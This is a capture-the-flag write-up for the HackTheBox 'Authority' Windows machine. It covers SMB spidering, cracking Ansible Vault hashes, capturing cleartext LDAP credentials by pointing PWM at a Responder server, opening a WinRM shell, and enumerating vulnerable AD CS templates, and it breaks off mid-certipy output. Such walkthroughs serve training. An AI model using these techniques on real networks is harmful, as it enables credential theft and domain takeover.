---
title: "HTB - Authority Writeup"
date: 2026-11-15 05:38:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, medium]
---
Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.
## P0
First of all, I use `rustscan` to find out all opened ports:
```
└─$ rustscan -a 10.129.229.56 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.229.56:53
Open 10.129.229.56:80
Open 10.129.229.56:88
Open 10.129.229.56:135
Open 10.129.229.56:139
Open 10.129.229.56:389
Open 10.129.229.56:445
Open 10.129.229.56:464
Open 10.129.229.56:593
Open 10.129.229.56:636
Open 10.129.229.56:3268
Open 10.129.229.56:3269
Open 10.129.229.56:5985
Open 10.129.229.56:8443
Open 10.129.229.56:9389
Open 10.129.229.56:47001
Open 10.129.229.56:49664
Open 10.129.229.56:49666
Open 10.129.229.56:49665
Open 10.129.229.56:49667
Open 10.129.229.56:49671
Open 10.129.229.56:49674
Open 10.129.229.56:49675
Open 10.129.229.56:49690
Open 10.129.229.56:49679
Open 10.129.229.56:49682
Open 10.129.229.56:49698
Open 10.129.229.56:52516
Open 10.129.229.56:63556
10.129.229.56 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49666,49665,49667,49671,49674,49675,49690,49679,49682,49698,52516,63556]
```
Next, I use `nmap` to get more detailed information about them:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49666,49665,49667,49671,49674,49675,49690,49679,49682,49698,52516,63556 -oN 10.129.229.56_nmap 10.129.229.56
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-14 17:43 -0500
Nmap scan report for 10.129.229.56 (10.129.229.56)
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-15 02:42:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-11-15T02:43:11+00:00; +3h58m34s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-15T02:43:12+00:00; +3h58m34s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-11-15T02:43:11+00:00; +3h58m34s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-15T02:43:12+00:00; +3h58m34s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2026-11-13T02:37:06
|_Not valid after:  2028-11-14T14:15:30
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
52516/tcp open  msrpc         Microsoft Windows RPC
63556/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h58m33s, deviation: 0s, median: 3h58m33s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-15T02:43:04
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   38.80 ms 10.10.14.1 (10.10.14.1)
2   39.00 ms 10.129.229.56 (10.129.229.56)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
```
From the result of nmap, we should setup some domain directly in `/etc/hots` so that it's easily for us in process of solving this machine:
```
└─$ cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.229.56 authority.htb authority.htb.corp
```
## P1 & P2
First of all, I start with port `53 and 80` but nothing interesting here. So I change to enumerate on port `445` which is SMB service. And what is lucky, it allows `anonymous` user:
```
└─$ nxc smb 10.129.229.56 -u 'anonymous' -p '' --shares                                      
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\anonymous: (Guest)
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions            Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------            ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                                 Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                                     Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares                        
SMB         10.129.229.56   445    AUTHORITY        Development     READ                   
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ                   Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                               Logon server share 
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                                 Logon server share
```
The `anonymous` user have `READ` permission on a customized SHARE `Development`. So I try to use `nxc smb` to filter files which have `password` pattern in its content like this:
```
└─$ nxc smb 10.129.229.56 -u 'anonymous' -p '' --spider 'Development' --content --pattern 'password'      
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)                                                                                                                                                                                          
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\anonymous: (Guest)
SMB         10.129.229.56   445    AUTHORITY        [*] Spidering .
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/ADCS/templates/openssl.cnf.j2 [lastm:'2023-03-17 09:37' size:11294 offset:4096 pattern:'password']                                                                                                                                                                                     
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/ADCS/templates/openssl.cnf.j2 [lastm:'2023-03-17 09:37' size:11294 offset:8192 pattern:'password']                                                                                                                                                                                     
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/.travis.yml [lastm:'2023-03-17 09:37' size:1414 offset:1414 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/README.md [lastm:'2023-03-17 09:37' size:5768 offset:4096 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/README.md [lastm:'2023-03-17 09:37' size:5768 offset:5768 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/TODO.md [lastm:'2023-03-17 09:37' size:119 offset:119 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/Vagrantfile [lastm:'2023-03-17 09:37' size:640 offset:640 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/.bin/clean_vault [lastm:'2023-03-17 09:37' size:677 offset:677 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/.bin/diff_vault [lastm:'2023-03-17 09:37' size:357 offset:357 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/.bin/smudge_vault [lastm:'2023-03-17 09:37' size:768 offset:768 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/defaults/main.yml [lastm:'2023-04-23 18:51' size:1046 offset:1046 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/tasks/main.yml [lastm:'2023-03-17 09:37' size:5235 offset:4096 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/tasks/main.yml [lastm:'2023-03-17 09:37' size:5235 offset:5235 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/LDAP/templates/sssd.conf.j2 [lastm:'2023-03-17 09:37' size:2556 offset:2556 pattern:'password']                                                                                                                                                                                        
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/PWM/ansible_inventory [lastm:'2023-03-17 09:37' size:174 offset:174 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/PWM/README.md [lastm:'2023-03-17 09:37' size:1290 offset:1290 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/PWM/defaults/main.yml [lastm:'2023-04-23 18:51' size:1591 offset:1591 pattern:'password']
SMB         10.129.229.56   445    AUTHORITY        //10.129.229.56/Development/Automation/Ansible/PWM/templates/tomcat-users.xml.j2 [lastm:'2023-03-17 09:37' size:388 offset:388 pattern:'password']
```
We have a lot of files here. Both of them under the folder `/Development/Automation/Ansible`. Maybe all of them are related to terminology `Ansible`. So I decide to research **what is Ansible**.<br>

*Ansible is an open-source automation tool that makes managing servers, deploying applications, and orchestrating complex IT workflows feel almost effortless. Unlike many configuration management tools, Ansible is agentless — it connects to your machines over standard SSH (or WinRM for Windows) without requiring any software to be pre-installed on the target systems. You describe what you want in simple, human-readable YAML playbooks — things like "install Nginx," "copy this config file," or "restart the service" — and Ansible handles the rest, executing tasks in order across as many hosts as you need. A key strength is idempotency: running a playbook multiple times won't change anything if the system is already in the desired state. That makes Ansible safe to re-run, easy to version-control, and a natural fit for CI/CD pipelines. Whether you're managing three servers or three hundred, Ansible turns repetitive manual work into consistent, repeatable code.*

*Ansible makes it easy to describe what your infrastructure should look like — but that description often needs to include sensitive data: database passwords, API tokens, admin credentials. You obviously can't commit those as plaintext. This is where Ansible Vault comes in: it lets you encrypt secrets and keep them safely alongside your automation code, without breaking the workflow you just set up.*

*Ansible Vault is Ansible's built-in way to keep secrets out of plain sight. It lets you encrypt sensitive data — passwords, API keys, certificates, or entire variable files — using AES-256 symmetric encryption, so you can safely commit them to Git alongside the rest of your automation code. You can encrypt a whole file or just a single value inside a playbook, and Ansible decrypts it in memory at runtime when you supply the correct vault password. That password is never stored in the repository; you provide it via a password file, a prompt, a CI/CD secret, or a vault password client script. A useful feature is vault IDs, which let you use different passwords for different environments (e.g., dev and prod) and control who can decrypt what. Just remember: Ansible Vault protects data at rest — encryption in transit is handled separately by SSH. Used well, Vault lets you treat secrets like code: versioned, reviewed, and automated, without leaking them.*

Okey, we have many files here but one of them looks more interesting than the rest. That is `/Development/Automation/Ansible/PWM/defaults/main.yml`
```
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764 
```
That's right, they are using `Ansible vaults`. After my research, I know that ansible usually use `AES 256` to encrypt sensitive data. And `AES 256` is a symemetric encryption so it need a secret key to encrypt as well as decrypt ansible vault. So we can use `hashcat` to findout the secret key by bruteforcing. But first of all, we need to convert normal ansible vault format to a new format which hashcat can understand. We can use `ansible2john` like below:
```
└─$ ansible2john ansible_vauls 
ansible_vauls:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
```
Then decrypting with `hashcat`:
```
.\hashcat.exe -a 0 -m 16900 '$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8' ..\own-wordlist\rockyou.txt
```
```
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
```
![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_08-42.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_08-42_1.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_08-43.png){: w="700" }

So after decrypting, we found three plaintext sensitive data like this: `svc_pwm`, `pWm_@dm!N_!23` and `DevT3st@123`. So I use `nxc` to verify whehter they are a valid credentials in AD:
```
└─$ nxc smb 10.129.229.56 -u 'svc_pwm' -p 'pWm_@dm!N_!23' --shares
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23 (Guest)
SMB         10.129.229.56   445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
```
└─$ nxc smb 10.129.229.56 -u 'svc_pwm' -p 'DevT3st@123' --shares
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_pwm:DevT3st@123 (Guest)
SMB         10.129.229.56   445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
Both combinations return `Guest`, which means they are not valid accounts; consequently, SMB has defaulted back to the `Guest` user. Don't let the `+` sign fool you :D<br>

At this point, there is nothing left for us to continue with. I'm stucking right now. So I come back the enumeration and recon again, specifically is nmap result. And I detect that there is a strange port `8443`. This is a http service, we can access it by a browser:

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15-16.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15-17.png){: w="700" }

This is **Open Source PWM (Password Manager)** which maybe has been set up by `ansible` which we have found in above public share `Development`<br>

*PWM is an open-source, web-based password self-service application for LDAP directories. In plain terms: it gives end users a clean web portal to reset forgotten passwords, unlock locked accounts, activate accounts for the first time, and change passwords — all without opening a helpdesk ticket. It supports major directory services including Microsoft Active Directory, OpenLDAP, NetIQ eDirectory, and generic LDAP, making it a practical fit for organizations that already run an LDAP-backed identity infrastructure. The project is GPLv2 licensed, Java-based (JSP/Servlet), and ships as a WAR file, a single JAR, or a Docker container — so you can "roll your own" password self-service without starting from scratch*<br>

This means PWM itself must have a ldap connection to the `LDAP directories`, specific here is the target Active Directory, to achieve all of its purposes. In other words, PWM itself must have a valid credential which can be used to interact with AD. So I check  `Configuration Editor ⇨ LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection`

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_15-29.png){: w="700" }

We see that `LDAP Proxy Password` now appear with `Value stored`. It means the value of it is stored in the configuration. So I try to download the configuration file to check:

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_15-30.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_15-30_1.png){: w="700" }

But unluckily, it has been encrypted all and can not read as plaintext. So I must find other ways.<br>
I realize that, this configuration allow us to change `LDAP URLs`. So why don't we change it to attacker LDAP server ? And from that, we can capture the the clear, plaintext LDAP password. Great idea !!!

![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_11-01.png){: w="700" }

Then I used `responeder` to setup a LDAP server. And what a lucky:
```
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.107]
    Responder IPv6             [fe80::a5c0:9711:c11b:61e7]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-2RQM52ETAI9]
    Responder Domain Name      [O8ZC.LOCAL]
    Responder DCE-RPC Port     [46132]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                  

[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb 
```
We find out a new credential: `svc_ldap:lDaP_1n_th3_cle4r!`. Use `evil-winrm` we can get the first flag like this:
```
└─$ evil-winrm -i 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'                  
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                     
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```
```
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> ls


    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/14/2026   9:38 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> type user.txt
```
## P3 & P4
Okey, now we can use `rusthound-ce` to find out some interesting information about the AD:
```
└─$ rusthound-ce -d authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --ldaps -z

---------------------------------------------------
Initializing RustHound-CE at 07:25:55 on 11/15/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-15T12:25:55Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-15T12:25:55Z INFO  rusthound_ce] Collection method: All
[2026-11-15T12:25:56Z INFO  rusthound_ce::ldap] Connected to AUTHORITY.HTB Active Directory!
[2026-11-15T12:25:56Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-11-15T12:25:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-15T12:25:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=authority,DC=htb
[2026-11-15T12:25:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-15T12:26:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=authority,DC=htb
[2026-11-15T12:26:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-15T12:26:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=authority,DC=htb
[2026-11-15T12:26:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-15T12:26:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=authority,DC=htb
[2026-11-15T12:26:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-11-15T12:26:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=authority,DC=htb
[2026-11-15T12:26:02Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 17%                                                                                                                                                                  [2026-11-15T12:26:02Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                                                                           
[2026-11-15T12:26:02Z INFO  rusthound_ce::objects::enterpriseca] Found 13 enabled certificate templates
[2026-11-15T12:26:02Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 5 users parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 3 ous parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 78 containers parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 3 aiacas parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 3 rootcas parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 37 certtemplates parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-11-15T12:26:02Z INFO  rusthound_ce::json::maker::common] .//20261115072602_authority-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 07:26:02 on 11/15/26! Happy Graphing!
```
![Upgrade_Notice.pdf](assets/image/htb/authority/2026-11-15_15-47.png){: w="700" }

We have many certificate template here. It reminds us to use `certipy` to check vulnerabilities related to `ADCS`:

```
└─$ certipy find -target authority.htb -dc-ip 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -stdout -vulnerable 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

/home/kali/venv/lib/python3.13/site-packages/requests/__init__.py:113: RequestsDependencyWarning: urllib3 (2.8.0) or chardet (7.7.0)/charset_normalizer (3.5.2) doesn't match a supported version!
  warnings.warn(
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
